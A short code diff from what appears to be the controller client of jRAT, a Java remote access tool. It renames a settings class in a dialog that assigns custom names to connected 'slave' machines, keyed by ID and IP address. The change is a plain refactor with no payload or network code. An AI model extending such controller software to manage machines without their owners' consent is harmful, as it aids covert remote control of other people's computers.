@@ -16,7 +16,7 @@ import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
-import se.jrat.client.settings.CustomID;
+import se.jrat.client.settings.SettingsCustomID;
 
 
 @SuppressWarnings("serial")
@@ -55,7 +55,7 @@ public class FrameRename extends BaseFrame {
 		btnRename = new JButton("Rename");
 		btnRename.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				CustomID.getGlobal().add(txtNewID.getText(), sl.getID(), sl.getRawIP());
+				SettingsCustomID.getGlobal().add(txtNewID.getText(), sl.getID(), sl.getRawIP());
 				for (AbstractSlave slave : Main.instance.getPanelClients().getSelectedSlaves()) {
 
 					if (slave != null && slave.equals(sl)) {
